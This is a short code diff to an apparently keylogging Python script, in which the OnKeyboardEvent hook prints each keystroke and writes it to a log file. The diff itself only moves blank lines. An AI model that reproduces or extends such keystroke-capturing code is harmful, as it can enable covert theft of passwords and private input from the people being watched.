@@ -52,7 +52,6 @@ def OnKeyboardEvent(event):
         else:
             print(chr(event.Ascii))
             log_file.write(chr(event.Ascii))
-            
 
     if event.MessageName == KEYUP:
         if event.Ascii < 32 or event.Ascii > 126:
@@ -60,6 +59,7 @@ def OnKeyboardEvent(event):
                 print(' x ' + str(special_key[2]))
                 log_file.write('x ' + str(special_key[2]))
                 special_key[2] = 0
+
             special_key[0] = event.Key
             special_key[1] = 'up'
             print(' ['+ event.Key +' up]')
